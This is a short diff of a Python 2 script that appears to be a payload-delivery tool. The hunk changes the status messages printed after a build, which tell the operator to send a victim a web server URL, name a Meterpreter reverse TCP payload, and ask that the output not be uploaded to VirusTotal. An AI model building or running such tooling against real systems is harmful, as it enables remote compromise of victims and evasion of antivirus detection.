@@ -245,9 +245,10 @@ def final(Part1, Part2, Part3, patt1, patt2, patt3):
 	print("{} {}Done {}{}{}{}".format(left_sign, g, reset, w, cmark, reset))
 
 	print "{} Send victim your webserver URL  E.g http://{}{}{}/".format(left_sign, g, IP, reset)
-	print "           --=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--        "
-	print "----------[ {}{}{} {}{}{} ]----------".format(w, "Make sure you open MSFconsole and listen for your payload on port", reset, g, PORT, reset)
-	print "           --=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--        "
+	print "           --=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-          "
+	print "----------[ {}{}{}  ]----------".format(w, "This Pattern will mark the end of the all parts of the shellcode", reset)
+    	print "           --=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-          "
+
 	print "\n"
 	print "-----------------------[ {}{}{} ]-----------------------".format(r, "PAYLOAD : windows/meterpreter/reverse_tcp", reset)
 	print "-----------------------[ {}{}{} ]-----------------------".format(r, "PLEASE DO NOT UPLOAD TO VIRUS TOTAL", reset)
